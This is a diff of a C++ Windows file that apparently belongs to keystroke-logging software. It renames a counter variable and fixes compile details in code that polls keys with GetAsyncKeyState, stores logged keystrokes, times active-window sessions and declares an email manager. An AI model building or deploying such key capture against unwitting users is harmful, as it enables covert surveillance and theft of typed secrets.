@@ -1,9 +1,9 @@
 ﻿#include "LoggingManager.h"
 
-DataManager dataManager = new DataManager();
-EmailManager emailManager = new EmailManager();
-Entry dataEntry = new Entry();
-int count = -1, threadCounter = 0;
+DataManager dataManager = DataManager();
+EmailManager emailManager = EmailManager();
+Entry dataEntry = Entry();
+int theCount = -1, threadCounter = 0;
 DWORD dwPID, mythreadid;
 HWND window;
 time_t rawStartTime, rawEndTime;
@@ -120,15 +120,15 @@ DWORD WINAPI mythread(LPVOID lpParameter) {
             }
 
             // clear loggedKeystrokes if session ends
-            if(count > 0 && threadCounter != count) {
+            if(theCount > 0 && threadCounter != theCount) {
                 pause(1);
                 loggedKeystrokes.clear();
-                threadCounter = count;
+                threadCounter = theCount;
             }
 
             // continuously check for key input
             if (GetAsyncKeyState(i) == -32767) {
-                if(count > -1) {
+                if(theCount > -1) {
                     save(i);
                 }
             }
@@ -137,7 +137,7 @@ DWORD WINAPI mythread(LPVOID lpParameter) {
 }
 
 // function triggered whenever a window becomes active
-void HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime) {
+void CALLBACK HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime) {
     DWORD newPID;
 
     // get active window handle
@@ -157,8 +157,8 @@ void HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd, LONG idObject, L
     endTime = newStartTime;
 
     // trigger end of session
-    count++;
-    if(count > 0) {
+	theCount++;
+    if(theCount > 0) {
         time_t duration = rawEndTime - rawStartTime;
 
         // store info in Entry Object
